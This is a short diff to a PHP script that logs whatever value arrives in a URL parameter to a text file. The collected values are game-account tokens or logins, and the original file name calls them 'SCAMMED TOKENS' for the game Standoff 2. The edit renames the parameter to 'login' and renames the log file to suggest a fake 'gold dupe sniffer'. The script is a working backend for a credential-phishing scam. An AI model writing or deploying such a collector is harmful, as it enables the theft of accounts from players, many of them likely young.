@@ -1,9 +1,9 @@
 <?php
  
-$token = $_GET['token'];
+$login = $_GET['login'];
  
-$file = fopen('SCAMMED TOKENS STANDOFF 2.txt', 'a');
-fwrite($file, $token . PHP_EOL);
+$file = fopen('token get ggold dupe sniffer standoff 2.txt', 'a');
+fwrite($file, $login . PHP_EOL);
 fclose($file);
  
 ?>
